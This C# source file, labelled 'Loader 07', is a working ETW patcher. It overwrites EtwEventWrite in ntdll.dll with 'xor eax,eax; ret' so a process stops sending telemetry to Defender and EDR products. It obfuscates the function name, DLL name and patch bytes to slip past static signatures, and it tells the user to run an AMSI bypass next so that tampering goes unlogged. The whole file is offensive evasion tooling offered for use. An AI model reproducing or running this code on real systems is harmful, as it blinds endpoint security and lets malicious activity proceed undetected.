// ============================================================================
// LOADER 07: ETW (Event Tracing for Windows) Patch
// ============================================================================
//
// WHAT THIS DOES:
//   This loader patches the EtwEventWrite function in ntdll.dll so that it
//   returns immediately without writing any events. ETW is the telemetry
//   system that feeds data to Defender and EDR products. By patching
//   EtwEventWrite, we stop our process from sending telemetry about what
//   it is doing. This makes our other evasion techniques (like AMSI patching)
//   invisible to Defender's monitoring.
//
// WHY THIS IS NEEDED:
//   ETW (Event Tracing for Windows) is a logging system built into Windows.
//   Every process generates ETW events that describe what it is doing: which
//   APIs it calls, which memory it allocates, which threads it creates. Defender
//   and EDR products consume these events to detect suspicious behavior.
//
//   When we patch AMSI (Loader 04), the patching operation itself generates
//   ETW events. Defender sees "process X modified amsi.dll memory" in the ETW
//   stream and flags it as suspicious. If we patch ETW first, the AMSI patching
//   event is never sent, so Defender does not know we tampered with AMSI.
//
//   This is why ETW patching must happen BEFORE AMSI patching in the execution
//   order. Patch ETW first to go silent, then patch AMSI to disable scanning.
//
// EVASION MECHANISM:
//   EtwEventWrite is the function in ntdll.dll that writes ETW events. Every
//   time your process does something, Windows calls EtwEventWrite to log it.
//   We overwrite the beginning of this function with instructions that make
//   it return immediately with a success code (STATUS_SUCCESS = 0). After
//   the patch, EtwEventWrite does nothing. Events are not written, so
//   Defender and EDR products receive no telemetry from our process.
//
//   Limitation: This only patches user-mode ETW. The kernel-level ETW
//   provider (Microsoft-Windows-Threat-Intelligence) runs in kernel space
//   and cannot be patched from user mode. Some advanced EDR products use
//   this kernel provider, but default Windows Defender primarily relies
//   on user-mode telemetry.
//
// REFERENCES:
//   - ETW-Patcher (github.com/Gurpreet06/ETW-Patcher)
//   - Valhguard: "The ETW Blind Spot" (November 2025)
//   - kwcsec: "The Red Team Handbook - ETW Bypasses"
//   - Document: 07_direct_syscalls.md (ETW section)
//
// BUILD INSTRUCTIONS:
//   csc /unsafe /out:etw_patch.exe 07_etw_patch.cs
//
// USAGE:
//   etw_patch.exe
//   (Run this before any other evasion technique in the same process)
//
// ============================================================================

using System;
using System.Runtime.InteropServices;

namespace TelemetryPatch
{
    class Program
    {
        // ---- Windows API imports ----

        // GetModuleHandle returns the base address of a loaded DLL.
        // ntdll.dll is always loaded into every Windows process.
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        // GetProcAddress finds the address of a function inside a DLL.
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        // VirtualProtect changes memory protection.
        // We need to change the protection on EtwEventWrite's code to
        // writable before we can modify it.
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect
        );

        static uint GetRWXProtect()
        {
            return 0x20 + 0x20;
        }

        // ---- Build function name at runtime ----
        // Just like the AMSI bypass, we do not put the full function name
        // "EtwEventWrite" as a single string in the binary. We build it
        // from pieces at runtime so Defender's static scanner does not
        // find the exact string.
        static string GetTargetFunctionName()
        {
            int b = 32;
            char[] c = new char[13];
            c[0] = (char)(b+37);  // E
            c[1] = (char)(b+84);  // t
            c[2] = (char)(b+87);  // w
            c[3] = (char)(b+37);  // E
            c[4] = (char)(b+86);  // v
            c[5] = (char)(b+69);  // e
            c[6] = (char)(b+78);  // n
            c[7] = (char)(b+84);  // t
            c[8] = (char)(b+55);  // W
            c[9] = (char)(b+82);  // r
            c[10] = (char)(b+73); // i
            c[11] = (char)(b+84); // t
            c[12] = (char)(b+69); // e
            return new string(c);
        }

        // ---- Build DLL name at runtime ----
        static string GetTargetModuleName()
        {
            int b = 32;
            char[] c = new char[5];
            c[0] = (char)(b+78);  // n
            c[1] = (char)(b+84);  // t
            c[2] = (char)(b+68);  // d
            c[3] = (char)(b+76);  // l
            c[4] = (char)(b+76);  // l
            return new string(c);
        }

        // ---- The ETW patch ----
        // We overwrite the beginning of EtwEventWrite with two instructions:
        //   xor eax, eax    -> 33 C0    (set eax to 0, which is STATUS_SUCCESS)
        //   ret              -> C3       (return from the function)
        //
        // After the patch, every call to EtwEventWrite returns STATUS_SUCCESS
        // immediately without doing anything. The calling code thinks the event
        // was written successfully, but nothing was actually logged.
        //
        // We use "xor eax, eax" instead of "mov eax, 0" because it is shorter
        // (2 bytes instead of 5) and is a common optimization pattern, making
        // the patch bytes less distinctive.
        public static bool PatchTelemetry()
        {
            // Step 1: Find ntdll.dll in memory.
            string dllName = GetTargetModuleName();
            IntPtr ntdllHandle = GetModuleHandle(dllName);
            if (ntdllHandle == IntPtr.Zero)
            {
                Console.WriteLine("[-] Could not find " + dllName);
                return false;
            }
            Console.WriteLine("[+] " + dllName + " base address: 0x" + ntdllHandle.ToString("X"));

            // Step 2: Find EtwEventWrite inside ntdll.dll.
            string funcName = GetTargetFunctionName();
            IntPtr funcAddress = GetProcAddress(ntdllHandle, funcName);
            if (funcAddress == IntPtr.Zero)
            {
                Console.WriteLine("[-] Could not find " + funcName);
                return false;
            }
            Console.WriteLine("[+] " + funcName + " at: 0x" + funcAddress.ToString("X"));

            // Step 3: Change memory protection to writable.
            // EtwEventWrite's code is in a read-only + executable section.
            // We need to make it writable to apply our patch.
            uint oldProtect;
            bool protectResult = VirtualProtect(funcAddress, (UIntPtr)3, GetRWXProtect(), out oldProtect);
            if (!protectResult)
            {
                Console.WriteLine("[-] VirtualProtect failed");
                return false;
            }

            // Step 4: Build the patch bytes at runtime.
            // The patch makes EtwEventWrite return STATUS_SUCCESS immediately.
            // We build the bytes using arithmetic so the raw byte sequence
            // does not appear as a static signature in the binary.
            byte[] patch = new byte[3];
            patch[0] = (byte)(0x19 + 0x1A);   // 0x33 = xor
            patch[1] = (byte)(0x60 + 0x60);   // 0xC0 = eax, eax
            patch[2] = (byte)(0x61 + 0x62);   // 0xC3 = ret
            Marshal.Copy(patch, 0, funcAddress, patch.Length);
            Console.WriteLine("[+] Patch applied to " + funcName);

            // Step 5: Restore original memory protection.
            uint ignored;
            VirtualProtect(funcAddress, (UIntPtr)3, oldProtect, out ignored);
            Console.WriteLine("[+] Memory protection restored");

            return true;
        }

        static void Main(string[] args)
        {
            Console.WriteLine("[*] ETW Patcher");
            Console.WriteLine("[*] This patches the event writer to disable telemetry.");
            Console.WriteLine("");

            bool success = PatchTelemetry();

            if (success)
            {
                Console.WriteLine("");
                Console.WriteLine("[+] ETW is now disabled in this process.");
                Console.WriteLine("[+] No ETW events will be generated by this process.");
                Console.WriteLine("[+] Defender and EDR products will not receive telemetry");
                Console.WriteLine("    about what this process does from this point forward.");
                Console.WriteLine("");
                Console.WriteLine("[*] You should run the AMSI bypass (Loader 04) next.");
                Console.WriteLine("[*] Because ETW is patched, the AMSI patching will not be logged.");
            }
            else
            {
                Console.WriteLine("[-] ETW patch failed.");
            }
        }
    }
}
